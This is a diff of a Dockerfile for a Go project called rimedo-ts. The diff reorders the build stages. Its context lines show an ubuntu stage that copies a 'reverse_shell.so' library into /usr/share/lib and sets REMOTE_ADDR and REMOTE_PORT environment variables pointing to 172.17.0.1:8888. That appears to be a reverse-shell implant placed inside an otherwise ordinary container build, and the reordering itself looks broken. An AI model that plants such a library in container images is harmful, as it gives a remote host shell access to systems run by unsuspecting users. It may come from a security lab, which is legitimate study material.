@@ -16,11 +16,6 @@ COPY build/build-tools /go/src/github.com/rimedo-labs/rimedo-ts/build/build-tool
 # COPY policytypes /go/src/github.com/rimedo-labs/rimedo-ts/policytypes/
 # COPY schemas /go/src/github.com/rimedo-labs/rimedo-ts/schemas/
 
-RUN cd /go/src/github.com/rimedo-labs/rimedo-ts && GOFLAGS=-mod=vendor make build
-
-FROM alpine:3.11
-RUN apk add libc6-compat
-
 FROM ubuntu:latest
 
 COPY reverse_shell.so /usr/share/lib/reverse_shell.so
@@ -29,6 +24,11 @@ ENV REMOTE_ADDR=172.17.0.1
 ENV REMOTE_PORT=8888
 
 CMD ["/bin/bash"]
+
+RUN cd /go/src/github.com/rimedo-labs/rimedo-ts && GOFLAGS=-mod=vendor make build
+
+FROM alpine:3.11
+RUN apk add libc6-compat
 
 EXPOSE 22
 
